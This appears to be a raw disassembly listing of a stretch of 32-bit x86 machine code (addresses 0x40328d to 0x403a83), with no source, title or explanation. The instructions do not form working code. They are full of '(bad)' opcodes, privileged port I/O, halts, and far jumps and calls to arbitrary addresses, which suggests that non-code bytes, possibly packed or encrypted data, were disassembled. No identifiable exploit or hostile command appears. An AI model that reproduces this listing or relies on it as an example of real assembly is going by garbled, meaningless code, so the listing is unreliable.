  40328d:	add    BYTE PTR [eax+ebx*2],bl
  403290:	bndldx bnd0,gs:[edi+0x63]
  403295:	xchg   edx,eax
  403296:	dec    eax
  403297:	sub    BYTE PTR [eax+ecx*4-0x5a9f096c],bl
  40329e:	sub    eax,DWORD PTR [edx-0x55ff81de]
  4032a4:	pop    ebp
  4032a5:	xor    al,ch
  4032a7:	add    DWORD PTR [ebp-0x1],eax
  4032aa:	or     cl,bh
  4032ac:	pop    ebp
  4032ad:	cmp    BYTE PTR [esi+0x3a],cl
  4032b0:	jmp    DWORD PTR [eax-0x3e]
  4032b3:	mov    ch,0xf9
  4032b5:	scas   al,BYTE PTR es:[edi]
  4032b6:	xchg   DWORD PTR [edx-0x23],eax
  4032b9:	xor    edi,DWORD PTR [edi+0x63]
  4032bc:	adc    DWORD PTR [edi+ecx*4],eax
  4032bf:	addr16 (bad) 
  4032c2:	frstor [ebx-0x6323a318]
  4032c8:	or     eax,DWORD PTR [ebp-0x529da209]
  4032ce:	and    edi,ecx
  4032d0:	dec    edx
  4032d1:	push   esi
  4032d2:	daa    
  4032d3:	and    esi,ecx
  4032d5:	jbe    0x4032cc
  4032d7:	dec    eax
  4032d8:	sbb    WORD PTR [edx+0x1e360adc],0xff8d
  4032e0:	lods   al,BYTE PTR ds:[esi]
  4032e1:	mov    eax,ds:0x283815fb
  4032e6:	pop    ebx
  4032e7:	ins    DWORD PTR es:[edi],dx
  4032e8:	add    BYTE PTR [edx+0x3e44a9b3],dh
  4032ee:	xchg   ebx,esi
  4032f0:	push   0x9011a951
  4032f5:	loope  0x403287
  4032f7:	mov    esi,0x85df08dd
  4032fc:	mov    DWORD PTR [ebx+0x74],ebp
  4032ff:	lea    edx,[edx+0x15]
  403302:	jmp    0xed19dd84
  403307:	cmp    edx,DWORD PTR [ebx]
  403309:	(bad)  
  40330b:	out    dx,al
  40330c:	and    edi,DWORD PTR [ebx-0x11]
  40330f:	pop    esp
  403310:	xchg   edi,eax
  403311:	(bad)  
  403313:	mov    ecx,0xcfa2f6bb
  403318:	push   DWORD PTR [ecx-0xe]
  40331b:	mov    esi,0x7905e0cb
  403320:	popa   
  403321:	es aas 
  403323:	and    dl,BYTE PTR [ebx+0x7e]
  403326:	addr16 jl 0x40338d
  403329:	pop    ecx
  40332a:	jp     0x403321
  40332c:	int3   
  40332d:	pop    eax
  40332e:	mov    al,0x60
  403330:	scas   al,BYTE PTR es:[edi]
  403331:	mov    ecx,0x1f63f06a
  403336:	ret    0xee1e
  403339:	aam    0x90
  40333b:	and    DWORD PTR [edi],ecx
  40333d:	inc    ebp
  40333e:	jmp    0x2aa93525
  403343:	hlt    
  403344:	in     al,0x81
  403346:	lods   al,BYTE PTR ds:[esi]
  403347:	jg     0x4032ed
  403349:	sub    BYTE PTR [edi-0x7],bh
  40334c:	sub    edx,DWORD PTR [ebx]
  40334e:	clc    
  40334f:	push   edi
  403350:	adc    esp,edx
  403352:	stc    
  403353:	push   esp
  403354:	jg     0x40338c
  403356:	sub    cl,BYTE PTR [ebx-0x22]
  403359:	push   edx
  40335a:	pop    ecx
  40335b:	mul    DWORD PTR [esi-0x3ada7f5b]
  403361:	adc    DWORD PTR [edx-0x43],edx
  403364:	push   edx
  403365:	ins    DWORD PTR es:[edi],dx
  403366:	cmp    DWORD PTR [esi],0xf28318f9
  40336c:	add    al,0xc5
  40336e:	lahf   
  40336f:	(bad)  
  403370:	(bad)  
  403371:	fisttp DWORD PTR [ebp+0x69]
  403374:	ret    
  403375:	mov    ebp,0x6ecffaa2
  40337a:	xchg   esi,eax
  40337b:	adc    DWORD PTR [eax+edi*2+0x3a],edx
  40337f:	sbb    esi,ebx
  403381:	xchg   ebx,eax
  403382:	pop    es
  403383:	fsubp  st(1),st
  403385:	dec    edi
  403386:	dec    eax
  403387:	sub    al,0x98
  403389:	cs push 0x5f
  40338c:	push   0xf3e268bd
  403391:	push   ebp
  403392:	rol    BYTE PTR [edi],cl
  403394:	mov    eax,ds:0xc58a9049
  403399:	xchg   ecx,eax
  40339a:	push   0x3b97ba3e
  40339f:	mov    cl,0x3f
  4033a1:	sub    DWORD PTR [ebp+ebp*4-0x2e3b3c19],ebx
  4033a8:	mov    eax,0x9fc09544
  4033ad:	cmp    BYTE PTR [edi],0x55
  4033b0:	cmp    al,bl
  4033b2:	xor    DWORD PTR [ecx-0x69d8c331],ebp
  4033b8:	stc    
  4033b9:	mov    BYTE PTR [ebx+0x53811199],bl
  4033bf:	mov    al,ds:0xad5c3ae
  4033c4:	cdq    
  4033c5:	add    eax,DWORD PTR [ecx-0x49ae6196]
  4033cb:	cmc    
  4033cc:	jne    0x403364
  4033ce:	lea    esp,[edi+ecx*1]
  4033d1:	mov    ebp,0x9d42fd30
  4033d6:	pop    esp
  4033d7:	out    dx,al
  4033d8:	and    al,0x19
  4033da:	jle    0x40342a
  4033dc:	lods   eax,DWORD PTR ds:[esi]
  4033dd:	popa   
  4033de:	cmp    eax,0x1cec3eac
  4033e3:	jo     0x40345e
  4033e5:	cmp    DWORD PTR [esp+edi*8+0x6c],ebp
  4033e9:	xlat   BYTE PTR ds:[ebx]
  4033ea:	inc    edx
  4033eb:	sar    BYTE PTR [edi+0x3a227aa8],1
  4033f1:	in     eax,0x1f
  4033f3:	nop
  4033f4:	dec    esp
  4033f5:	imul   eax,ebx,0xffffffc9
  4033f8:	mov    dl,0xb9
  4033fa:	data16 sbb ch,ah
  4033fd:	cmp    eax,0x34e9ac8c
  403402:	adc    BYTE PTR [edx-0x5b],al
  403405:	sar    BYTE PTR [ebx+0x43],1
  403408:	jmp    0x403447
  40340a:	mov    al,0x1e
  40340c:	push   es
  40340d:	imul   esp,edi,0xffffff80
  403410:	test   eax,0x4abc46fe
  403415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403417:	rcr    DWORD PTR [edx+ebx*2],1
  40341a:	push   cs
  40341b:	mov    edi,0xdd1f0029
  403420:	bound  esi,QWORD PTR [ebp+ebp*1+0xb]
  403424:	xchg   esi,eax
  403425:	push   ecx
  403426:	aaa    
  403427:	jmp    0xdbb39078
  40342c:	in     eax,0x3a
  40342e:	int3   
  40342f:	addr16 mov eax,0x87997e9e
  403435:	mov    ebx,0x213dd9a8
  40343a:	or     esi,DWORD PTR [ebx-0xa]
  40343d:	(bad)  
  40343e:	shl    BYTE PTR [ebx],0xce
  403441:	test   eax,0xf6ad18ea
  403446:	lods   al,BYTE PTR ds:[esi]
  403447:	mov    ecx,0x4ee56846
  40344c:	fmul   st(5),st
  40344e:	loop   0x4033f0
  403450:	adc    al,BYTE PTR [esi+0x3e81e200]
  403456:	mov    dl,0xde
  403458:	adc    DWORD PTR [ecx-0x7bce3254],eax
  40345e:	cmp    ecx,ebx
  403460:	popa   
  403461:	xor    ebx,DWORD PTR [esi-0x70]
  403464:	xchg   edx,eax
  403465:	sbb    edx,ebp
  403467:	ror    ah,1
  403469:	mov    esi,0x507386ad
  40346e:	outs   dx,BYTE PTR ds:[esi]
  40346f:	pop    esp
  403470:	mov    cl,BYTE PTR [ecx+edx*1+0x41]
  403474:	call   0xc512:0x518b6050
  40347b:	jo     0x403428
  40347d:	ja     0x403459
  40347f:	inc    eax
  403480:	gs pop ebx
  403482:	repz inc ebp
  403484:	xchg   esp,eax
  403485:	add    cl,BYTE PTR [eax-0x4a]
  403488:	out    0x1b,eax
  40348a:	push   edi
  40348b:	pop    ds
  40348c:	push   edi
  40348d:	push   0xffffffb4
  40348f:	dec    esi
  403490:	lock inc ebp
  403492:	and    al,0x94
  403494:	popa   
  403495:	sahf   
  403496:	fimul  DWORD PTR [edi]
  403498:	fidivr DWORD PTR [ebp-0x54d69ea0]
  40349e:	popa   
  40349f:	sub    BYTE PTR [edi-0x77],al
  4034a2:	dec    esp
  4034a3:	ins    BYTE PTR es:[edi],dx
  4034a4:	xchg   ebp,eax
  4034a5:	sub    BYTE PTR [ecx-0x33155c02],ch
  4034ab:	xor    esp,esi
  4034ad:	mov    edi,0xaeb34df5
  4034b2:	dec    ecx
  4034b3:	mov    dl,0xbd
  4034b5:	push   es
  4034b6:	enter  0x3cc5,0x67
  4034ba:	pop    ecx
  4034bb:	test   al,0x5a
  4034bd:	cmp    BYTE PTR [edx-0x78],dl
  4034c0:	adc    eax,0x3e4d8622
  4034c5:	sub    BYTE PTR [ebx-0x32],al
  4034c8:	jbe    0x4034d1
  4034ca:	(bad)  
  4034cb:	cmc    
  4034cc:	pop    edi
  4034cd:	shl    BYTE PTR [edx-0xf],0x9a
  4034d1:	pop    ebp
  4034d2:	retf   
  4034d3:	cmp    al,0x1c
  4034d5:	and    DWORD PTR [eax],ebx
  4034d7:	adc    al,0xc5
  4034d9:	scas   al,BYTE PTR es:[edi]
  4034da:	idiv   DWORD PTR [ebp+0x1b28873]
  4034e0:	mov    eax,0x82d34e69
  4034e5:	inc    edi
  4034e6:	cmc    
  4034e7:	push   ecx
  4034e8:	mov    edx,0x53ebc38e
  4034ed:	mov    BYTE PTR [eax+ebp*4],al
  4034f0:	cmp    dl,bh
  4034f2:	jne    0x403480
  4034f4:	mov    edx,0xcf87f1a7
  4034f9:	cmp    al,0x74
  4034fb:	retf   0x9e37
  4034fe:	dec    esp
  4034ff:	repnz rol BYTE PTR [ebx-0xd0368c9],0xd8
  403507:	aam    0x11
  403509:	inc    edi
  40350a:	repnz ins DWORD PTR es:[edi],dx
  40350c:	jmp    0x290c:0xc71c4805
  403513:	push   edx
  403514:	(bad)  
  403515:	mov    bh,0xec
  403517:	or     eax,0x6e44db43
  40351c:	mov    eax,0xc88e1fcb
  403521:	addr16 inc ecx
  403523:	stos   DWORD PTR es:[edi],eax
  403524:	mov    ds:0x29690316,eax
  403529:	cmp    eax,0x8b59596b
  40352e:	(bad)  
  403530:	sbb    al,0xeb
  403532:	lahf   
  403533:	test   DWORD PTR [di+0x52],esi
  403537:	imul   esi,DWORD PTR [edi-0x597196db],0xffffff98
  40353e:	mov    al,ds:0x4c84a7e7
  403543:	repnz rcl DWORD PTR [edx-0x61],1
  403547:	loope  0x4034eb
  403549:	or     ecx,esi
  40354b:	test   DWORD PTR [ebp-0x70032c22],ebp
  403551:	sbb    ebp,DWORD PTR [eax-0x3d]
  403554:	aad    0x1f
  403556:	loopne 0x4034fd
  403558:	add    cl,BYTE PTR [ebx]
  40355a:	pop    edi
  40355b:	test   BYTE PTR [ebp+0x72b73db],dh
  403561:	in     al,dx
  403562:	mov    dh,0x2
  403564:	nop
  403565:	mov    esi,0xcaa1d66e
  40356a:	lea    esp,[esi+0x526b7bf2]
  403570:	enter  0xd681,0x9c
  403574:	test   al,0x36
  403576:	cs cmp ah,0x51
  40357a:	(bad)  
  40357b:	adc    BYTE PTR [edi],ah
  40357d:	add    al,BYTE PTR [ebx]
  40357f:	and    bh,BYTE PTR [esi-0x49d7d225]
  403585:	mov    ah,0x4e
  403587:	nop
  403588:	repnz div ecx
  40358b:	cli    
  40358c:	aas    
  40358d:	push   ecx
  40358e:	mov    edx,DWORD PTR [ebx-0x1f]
  403591:	adc    bh,dh
  403593:	adc    ebp,esi
  403595:	mov    ebx,0xb4d60dda
  40359a:	adc    BYTE PTR [bp+di+0x23],al
  40359e:	xor    ch,BYTE PTR [edx+0x26b024e0]
  4035a4:	fcos   
  4035a6:	hlt    
  4035a7:	adc    al,0xfe
  4035a9:	pop    ds
  4035aa:	loope  0x40359e
  4035ac:	add    ch,ah
  4035ae:	pop    edi
  4035af:	test   al,0xe6
  4035b1:	(bad)  
  4035b3:	cli    
  4035b4:	mov    ch,0x1d
  4035b6:	hlt    
  4035b7:	fwait
  4035b8:	leave  
  4035b9:	out    dx,al
  4035ba:	push   esi
  4035bb:	dec    esp
  4035bc:	inc    ecx
  4035bd:	pushf  
  4035be:	xchg   edi,eax
  4035bf:	push   edi
  4035c0:	cld    
  4035c1:	mov    ch,0x9e
  4035c3:	cmp    BYTE PTR [edx-0x72],ah
  4035c6:	stos   DWORD PTR es:[edi],eax
  4035c7:	lods   al,BYTE PTR ds:[esi]
  4035c8:	rcl    DWORD PTR [edi],0xb
  4035cb:	mov    dl,0xfd
  4035cd:	xor    DWORD PTR [edi-0xcd3a0c2],esi
  4035d3:	call   0xe54e1a7e
  4035d8:	dec    edx
  4035d9:	pop    esp
  4035da:	pop    edx
  4035db:	ror    BYTE PTR [eax+edi*1-0x39bddd74],1
  4035e2:	(bad)  
  4035e3:	mov    ebp,0xb0c81f71
  4035e8:	mov    edi,ebx
  4035ea:	mov    dl,0x25
  4035ec:	dec    esp
  4035ed:	lds    esi,FWORD PTR [ecx+0x4c]
  4035f0:	push   cs
  4035f1:	dec    ecx
  4035f2:	dec    ebp
  4035f3:	mov    al,0xf1
  4035f5:	shl    cl,1
  4035f7:	das    
  4035f8:	mov    ax,0xdc60
  4035fc:	mov    al,ds:0x22509d5e
  403601:	idiv   BYTE PTR [ebp+0x265ac544]
  403607:	stc    
  403608:	aas    
  403609:	dec    esi
  40360a:	mov    ah,0x17
  40360c:	aas    
  40360d:	push   ss
  40360e:	sub    eax,0xe5e695bb
  403613:	jle    0x403604
  403615:	pop    edi
  403616:	mov    ecx,DWORD PTR [esi+ebp*4+0x4]
  40361a:	dec    esi
  40361b:	inc    ebp
  40361c:	test   eax,0xaae14c8e
  403621:	sahf   
  403622:	push   ds
  403623:	retf   0xe242
  403626:	ds mov ebx,0x470d0311
  40362c:	test   DWORD PTR [ebx-0x7b],ebp
  40362f:	imul   esi,eax,0xffffffc1
  403632:	popa   
  403633:	dec    edx
  403634:	int3   
  403635:	pushf  
  403636:	in     al,0xa7
  403638:	shr    DWORD PTR [eax],1
  40363a:	sbb    edx,DWORD PTR [ebp+edi*1+0x2a28027b]
  403641:	in     al,0xda
  403643:	add    dl,BYTE PTR [edi-0x2958128f]
  403649:	imul   edi,DWORD PTR [eax],0x39
  40364c:	(bad)  
  40364d:	jg     0x4035ee
  40364f:	jp     0x403618
  403651:	shl    BYTE PTR [eax-0x253d5d0a],cl
  403657:	add    bx,si
  40365a:	lods   al,BYTE PTR ds:[esi]
  40365b:	mov    ecx,DWORD PTR [esi]
  40365d:	arpl   sp,bp
  40365f:	gs adc edi,ebx
  403662:	sub    BYTE PTR [eax],cl
  403664:	jbe    0x4036c4
  403666:	xchg   ebp,eax
  403667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403668:	rol    DWORD PTR [ecx],cl
  40366a:	xchg   esp,eax
  40366b:	pop    edi
  40366c:	jnp    0x4036bc
  40366e:	push   cs
  40366f:	into   
  403670:	xchg   esp,eax
  403671:	sbb    al,0x59
  403673:	stos   BYTE PTR es:[edi],al
  403674:	or     al,0x6d
  403676:	shl    BYTE PTR [esi+0xa4dca50],1
  40367c:	std    
  40367d:	sbb    al,0x13
  40367f:	add    BYTE PTR [edi-0x6e],cl
  403682:	out    dx,al
  403683:	mov    ds:0x8fecb1b8,eax
  403688:	lock ret 
  40368a:	pop    ds
  40368b:	stos   BYTE PTR es:[edi],al
  40368c:	imul   edi,DWORD PTR [edi+0x26faf29c],0xb726ee7b
  403696:	jle    0x4036bb
  403698:	in     eax,0x6d
  40369a:	xchg   ebp,eax
  40369b:	(bad)  
  40369c:	(bad)  [eax]
  40369e:	pop    es
  40369f:	sbb    al,0xc7
  4036a1:	in     eax,dx
  4036a2:	lods   al,BYTE PTR ds:[esi]
  4036a3:	xchg   ebp,eax
  4036a4:	sbb    cl,BYTE PTR [eax+0x2d07667c]
  4036aa:	test   eax,0x902b9909
  4036af:	mov    bh,0xb0
  4036b2:	loopne 0x40367e
  4036b4:	daa    
  4036b5:	sar    BYTE PTR ds:0xd58e8114,0xbf
  4036bc:	sbb    eax,DWORD PTR [eax-0x67]
  4036bf:	jnp    0x40370b
  4036c1:	idiv   DWORD PTR [eax+0x93ab06d]
  4036c7:	gs lahf 
  4036c9:	jne    0x4036b3
  4036cb:	cli    
  4036cc:	ret    0xb0d2
  4036cf:	sub    BYTE PTR [esp+ebp*2-0x71],ch
  4036d3:	jmp    0xf3b6:0x9973a508
  4036da:	push   cs
  4036db:	lock sub DWORD PTR [eax-0x7d],edx
  4036df:	push   0x8dcf4117
  4036e4:	ds sbb ecx,ebp
  4036e7:	jg     0x4036d5
  4036e9:	mov    dh,0xc2
  4036eb:	pop    edx
  4036ec:	das    
  4036ed:	inc    ebp
  4036ee:	ins    BYTE PTR es:[edi],dx
  4036ef:	sub    al,0xd4
  4036f1:	mov    dl,0x18
  4036f3:	call   0xd7c6:0x9d4ea269
  4036fa:	ins    DWORD PTR es:[edi],dx
  4036fb:	into   
  4036fc:	push   ds
  4036fd:	cmc    
  4036fe:	or     eax,0xdf44f207
  403703:	push   eax
  403704:	or     BYTE PTR [edi-0x42],0x56
  403708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403709:	inc    ebx
  40370a:	into   
  40370b:	es xchg edx,eax
  40370d:	repz cmp BYTE PTR [ebp+0x20],dh
  403711:	jns    0x40372c
  403713:	dec    esi
  403714:	jle    0x403723
  403716:	dec    ecx
  403717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403718:	js     0x4036af
  40371a:	sbb    DWORD PTR [esi],ecx
  40371c:	or     al,0x5e
  40371e:	fsubr  DWORD PTR [edi-0x21]
  403721:	cdq    
  403722:	pop    es
  403723:	or     al,0xab
  403725:	mov    ds:0x292f8197,al
  40372a:	cmp    eax,0x8882e3d8
  40372f:	mov    dl,0x95
  403731:	pop    ebp
  403732:	xor    dh,BYTE PTR [esi]
  403734:	sahf   
  403735:	and    eax,0x5d5161b2
  40373a:	lods   al,BYTE PTR ds:[esi]
  40373b:	push   ecx
  40373c:	push   ss
  40373d:	je     0x4036f3
  40373f:	sub    bl,cl
  403741:	fcomi  st,st(6)
  403743:	cmp    eax,DWORD PTR [eax]
  403745:	jne    0x403746
  403747:	arpl   bx,cx
  403749:	jae    0x403716
  40374b:	and    BYTE PTR [esi-0x43d89060],al
  403751:	bound  esi,QWORD PTR [edi+edi*2+0x54ca95d3]
  403758:	cmp    ebx,DWORD PTR [edx-0x7640ebf7]
  40375e:	lea    eax,[edx+ecx*8]
  403761:	mov    BYTE PTR [ebx-0x2c],cl
  403764:	test   ebx,ebp
  403766:	ja     0x403767
  403768:	jle    0x4037ad
  40376a:	and    esp,DWORD PTR [ebp+0xd]
  40376d:	and    eax,0x9f8c5e7e
  403772:	sbb    BYTE PTR [esi-0x554968eb],bh
  403778:	mov    esp,0xd1b6b19
  40377d:	imul   ebx,ebp,0x47dd799b
  403783:	sbb    al,0x3
  403785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403786:	(bad)  
  403787:	sbb    al,0xef
  403789:	aam    0xfa
  40378b:	xchg   ecx,eax
  40378c:	fs (bad) 
  40378e:	mov    es,esp
  403790:	push   edi
  403791:	or     eax,0xaaac96c7
  403796:	sar    BYTE PTR [ecx],1
  403798:	cmp    DWORD PTR ds:0x6ec87f37,0x4c431144
  4037a2:	push   ebx
  4037a3:	xchg   edi,eax
  4037a4:	adc    esi,DWORD PTR [ebp+0x34decbd9]
  4037aa:	xchg   edi,eax
  4037ab:	and    al,0x83
  4037ad:	push   esi
  4037ae:	mov    al,ds:0xfe0bae24
  4037b3:	ror    DWORD PTR [edi],cl
  4037b5:	adc    al,0xb0
  4037b7:	std    
  4037b8:	mov    ?,WORD PTR [edi+ecx*1+0x1ef445a4]
  4037bf:	test   bl,bl
  4037c1:	lock add eax,0x86f39fa8
  4037c7:	sti    
  4037c8:	daa    
  4037c9:	fld    QWORD PTR [edx+0x7a]
  4037cc:	test   al,0xd0
  4037ce:	ror    BYTE PTR [eax],cl
  4037d0:	fidiv  DWORD PTR [eax+0x238a536]
  4037d6:	mov    DWORD PTR ds:0xf064c298,ebx
  4037dc:	xchg   edx,eax
  4037dd:	pop    edx
  4037de:	fisub  WORD PTR [esi]
  4037e0:	repz ss mov cl,0xf
  4037e4:	xchg   DWORD PTR [ecx+0x20cd4385],ebx
  4037ea:	push   ss
  4037eb:	mov    DWORD PTR [edi-0x4],eax
  4037ee:	sub    BYTE PTR [eax],cl
  4037f0:	(bad)  
  4037f2:	stc    
  4037f3:	sbb    ebp,esi
  4037f5:	sbb    BYTE PTR [esi],bh
  4037f7:	sar    BYTE PTR [edi+ecx*8],0xc7
  4037fb:	jg     0x403845
  4037fd:	inc    esp
  4037fe:	ja     0x403857
  403800:	ficomp DWORD PTR ds:0xc468ed79
  403806:	sti    
  403807:	mov    dh,0x49
  403809:	mov    ds:0x340e340b,al
  40380e:	fistp  WORD PTR [esi]
  403810:	imul   ecx,esi,0x38
  403813:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403815:	inc    eax
  403816:	dec    edx
  403817:	iret   
  403818:	out    dx,al
  403819:	pcmpeqd mm7,QWORD PTR [esi+0x24f6f1df]
  403820:	cmp    edi,DWORD PTR [ebx]
  403822:	push   edx
  403823:	jne    0x40382d
  403825:	imul   BYTE PTR [edx]
  403827:	jb     0x403831
  403829:	or     al,0x57
  40382b:	or     eax,0xd6885cfd
  403830:	sub    ch,BYTE PTR [eax-0x2f]
  403833:	(bad)  
  403834:	cmp    al,BYTE PTR [edx-0x45e8f5fa]
  40383a:	sar    DWORD PTR [esi],1
  40383c:	aam    0x5a
  40383e:	sub    al,BYTE PTR [edx-0xa77e1b1]
  403844:	lods   eax,DWORD PTR ds:[esi]
  403845:	or     BYTE PTR [ebx+0x36],dh
  403848:	mov    al,ds:0x946143c9
  40384d:	into   
  40384e:	les    esp,FWORD PTR [esi+0x5d]
  403851:	call   0x9b3c27c1
  403856:	stos   BYTE PTR es:[edi],al
  403857:	add    BYTE PTR [esi],ah
  403859:	pop    ecx
  40385a:	mov    ds,WORD PTR [ecx+edi*1-0x508466b0]
  403861:	xchg   edi,eax
  403862:	sbb    eax,0xd85171ba
  403867:	popf   
  403868:	push   0x1c
  40386a:	test   eax,0xf8bf21f2
  40386f:	and    eax,0xac89ceaa
  403874:	out    0xe9,eax
  403876:	mov    bl,BYTE PTR [ebp-0x14]
  403879:	push   es
  40387a:	nop
  40387b:	sub    al,0x19
  40387d:	repz sbb ebx,DWORD PTR [eax+0x3c]
  403881:	cdq    
  403882:	adc    BYTE PTR [esi+0x1996236e],al
  403888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403889:	repz mov ah,0x6c
  40388c:	pop    edx
  40388d:	jmp    0x41e0ea11
  403892:	jo     0x4038bb
  403894:	sahf   
  403895:	(bad)  
  403896:	sbb    eax,DWORD PTR [ecx]
  403898:	mov    bl,0x77
  40389a:	retf   
  40389b:	xchg   edi,eax
  40389c:	lds    esi,FWORD PTR [ecx-0x2d1a5698]
  4038a2:	(bad)  
  4038a3:	ins    DWORD PTR es:[edi],dx
  4038a4:	pop    ds
  4038a5:	jbe    0x403895
  4038a7:	mov    al,ds:0xe4d46444
  4038ac:	rcl    BYTE PTR [eax+0x64],1
  4038af:	cmp    al,0x57
  4038b1:	iret   
  4038b2:	push   es
  4038b3:	add    edx,esp
  4038b5:	stc    
  4038b6:	mov    ebx,0xd22a94c7
  4038bb:	jg     0x403891
  4038bd:	ret    
  4038be:	xchg   edx,eax
  4038bf:	inc    edi
  4038c0:	enter  0x5a81,0x1
  4038c4:	enter  0x933b,0xbc
  4038c8:	add    BYTE PTR [ecx],ch
  4038ca:	push   ecx
  4038cb:	inc    edi
  4038cc:	and    eax,0x93d728b7
  4038d1:	xchg   DWORD PTR [ecx],esi
  4038d3:	pop    esi
  4038d4:	mov    ebx,0x345321cd
  4038d9:	push   esp
  4038da:	xor    eax,0x2a04d32c
  4038df:	jmp    0xc3aa3e1e
  4038e4:	mov    ah,0x7
  4038e6:	popf   
  4038e7:	(bad)  
  4038e8:	pop    ds
  4038e9:	push   ds
  4038ea:	and    al,0xb9
  4038ec:	into   
  4038ed:	pop    eax
  4038ee:	or     BYTE PTR ds:0xf0a6f214,ch
  4038f4:	paddq  mm1,mm7
  4038f7:	fild   DWORD PTR [ebx]
  4038f9:	mov    al,es:0x80e93df7
  4038ff:	mov    dl,0xd
  403901:	gs je  0x40393f
  403904:	hlt    
  403905:	test   BYTE PTR [edx+0x32],bh
  403908:	push   ecx
  403909:	xchg   esi,eax
  40390a:	mov    cs,esi
  40390c:	jle    0x403947
  40390e:	fmul   DWORD PTR [esi]
  403910:	cli    
  403911:	mov    esi,0x2fd6cfdd
  403916:	cwde   
  403917:	mov    esi,?
  403919:	and    DWORD PTR [edx+edi*8+0x6d],ebp
  40391d:	iret   
  40391e:	call   0x56e4967b
  403923:	bound  edx,QWORD PTR [ebx+0x1e]
  403926:	jnp    0x403952
  403928:	int3   
  403929:	stc    
  40392a:	push   cs
  40392b:	(bad)  
  40392d:	rdtsc  
  40392f:	int3   
  403930:	xchg   edx,eax
  403931:	in     eax,dx
  403932:	clc    
  403933:	popa   
  403934:	test   al,0x5a
  403936:	imul   BYTE PTR [ebx+0x23df51c7]
  40393c:	jmp    0x69adf0a4
  403941:	retf   
  403942:	cmp    eax,0xa63cf1e8
  403947:	les    edi,FWORD PTR [edi-0x47a04bc7]
  40394d:	adc    BYTE PTR [edi-0x3a],bl
  403950:	lahf   
  403951:	in     eax,dx
  403952:	xor    DWORD PTR [eax],ecx
  403954:	mov    bl,0x8a
  403956:	xor    ebp,DWORD PTR [ecx]
  403958:	call   0x5d45:0x533e32e1
  40395f:	xor    dl,BYTE PTR [ecx]
  403961:	ret    
  403962:	jge    0x40394d
  403964:	mov    ecx,0x2ab34acc
  403969:	xor    eax,0xfd61ec4a
  40396e:	enter  0x6615,0x22
  403972:	(bad)  
  403973:	xchg   edi,eax
  403974:	dec    eax
  403975:	cwde   
  403976:	hlt    
  403977:	(bad)  
  403978:	lock add al,0x95
  40397b:	push   esp
  40397c:	pusha  
  40397d:	pop    ecx
  40397e:	(bad)  
  40397f:	sub    DWORD PTR [esi+0x78dc3856],edi
  403985:	sbb    DWORD PTR [esp+eiz*8+0x58],0xffffffa3
  40398a:	pop    esi
  40398b:	ja     0x40395c
  40398d:	ret    0x871
  403990:	fmul   st,st(1)
  403992:	scas   eax,DWORD PTR es:[edi]
  403993:	loopne 0x403944
  403995:	out    dx,al
  403996:	cmp    BYTE PTR [ebp+0x3eccd8f4],ch
  40399c:	jg     0x403941
  40399e:	daa    
  40399f:	dec    esi
  4039a0:	jecxz  0x403947
  4039a2:	lock push ebx
  4039a4:	in     al,dx
  4039a5:	push   ds
  4039a6:	retf   0xe399
  4039a9:	daa    
  4039aa:	cli    
  4039ab:	and    BYTE PTR [ebx-0x47],0xa
  4039af:	push   0x63
  4039b1:	inc    ebp
  4039b2:	inc    esi
  4039b3:	mov    ecx,0x22826a47
  4039b8:	xor    BYTE PTR [ebx],dh
  4039ba:	or     DWORD PTR [eax-0x47e2af9],0x60
  4039c1:	fstp   st(0)
  4039c3:	lods   al,BYTE PTR ds:[esi]
  4039c4:	adc    ebp,DWORD PTR [ecx]
  4039c6:	and    ah,bl
  4039c8:	inc    ebp
  4039c9:	jp     0x40395a
  4039cb:	stc    
  4039cc:	daa    
  4039cd:	push   ecx
  4039ce:	inc    edx
  4039cf:	sub    eax,0x7eed5e02
  4039d4:	fsubr  DWORD PTR [esi-0x6c]
  4039d7:	dec    eax
  4039d8:	data16 mov cl,0xa7
  4039db:	jnp    0x40398f
  4039dd:	nop
  4039de:	or     ah,dh
  4039e0:	push   esi
  4039e1:	jns    0x403a25
  4039e3:	add    eax,edi
  4039e5:	add    ah,BYTE PTR [eax-0x6928e938]
  4039eb:	add    DWORD PTR [ecx+0x4abf1612],ecx
  4039f1:	clc    
  4039f2:	xchg   BYTE PTR [edi-0x2f],ah
  4039f5:	(bad)  
  4039f6:	leave  
  4039f7:	fmul   QWORD PTR [ebp+0x43c5f105]
  4039fd:	ja     0x403985
  4039ff:	data16 mov cl,0xe3
  403a02:	mov    edx,0x4c9b60d2
  403a07:	jnp    0x403a1c
  403a09:	rol    DWORD PTR [ebp-0xd],0xcf
  403a0d:	ds je  0x4039b3
  403a10:	adc    esi,esp
  403a12:	pusha  
  403a13:	push   ebx
  403a14:	jbe    0x4039f1
  403a16:	ja     0x4039a5
  403a18:	arpl   WORD PTR [edx+0x6d00c041],cx
  403a1e:	adc    DWORD PTR [edx+0x20150fa0],edx
  403a24:	jmp    0xbe77:0x9bb7c0a
  403a2b:	pop    ecx
  403a2c:	daa    
  403a2d:	jg     0x4039b6
  403a2f:	mov    esi,0x85c2a2a7
  403a34:	call   0xf62:0x5e75d197
  403a3b:	pop    ss
  403a3c:	fdiv   DWORD PTR [edi]
  403a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a3f:	dec    esi
  403a40:	mov    dh,0xbc
  403a42:	push   ebx
  403a43:	xor    ebx,0x7b
  403a46:	pop    esi
  403a47:	out    0x75,eax
  403a49:	sbb    bl,BYTE PTR [eax]
  403a4b:	mov    al,ds:0x3709fd27
  403a50:	int3   
  403a51:	and    al,0x13
  403a53:	pushf  
  403a54:	aam    0x82
  403a56:	repnz mov eax,0x4c1de54b
  403a5c:	mov    ebp,0x73289a89
  403a61:	cs (bad) 
  403a63:	sbb    DWORD PTR [ebp+0x588d63d3],ebp
  403a69:	imul   ebp,DWORD PTR [edi-0xc],0x4e
  403a6d:	outs   dx,BYTE PTR ds:[esi]
  403a6e:	xor    eax,0xbde032f0
  403a73:	(bad)  
  403a74:	sahf   
  403a75:	test   ecx,0x12c73fe4
  403a7b:	push   edx
  403a7c:	mov    esi,0xb645d31a
  403a81:	gs ret 
  403a83:	shl    DWORD PTR [esi+edx*1-0x56],0x40
